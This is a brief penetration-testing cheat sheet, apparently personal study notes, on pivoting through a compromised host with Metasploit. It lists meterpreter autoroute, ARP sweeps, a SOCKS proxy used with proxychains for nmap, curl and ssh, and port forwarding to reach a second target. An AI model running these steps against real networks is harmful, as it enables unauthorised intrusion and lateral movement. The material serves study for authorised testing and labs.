# Pivoting

## MSF with Proxychains
```bash
# at meterpreter stage
ifconfig
run autoroute -s <target_network>
background

# discover live hosts
use auxiliary/scanner/discovery/arp_sweep
set RHOSTS <network>
run

# starting a socks proxy server
use auxiliary/server/socks_proxy
set SRVPORT 8080
set VERSION 4a
run

# config the socks
echo 'socks4 127.0.0.1 8080' >> /etc/proxychains.conf

# usage
proxychains <command> <remote_target>
proxychains nmap -sT -Pn <remote_target>
proxychains curl http://<remote_target>
proxychains ssh <user>@<remote_target>
```

## Only MSF
```bash
# at meterpreter stage
ifconfig
run autoroute -s <target_network>
background

use auxiliary/scanner/portscan/tcp
set RHOSTS <target_2>
set PORTS 1-1000
run

sessions -i 1
portfwd add -l <local_port> -p <remote_port> -r <target_2>
portfwd list

nmap -sS -sV -p <local_port> localhost
```
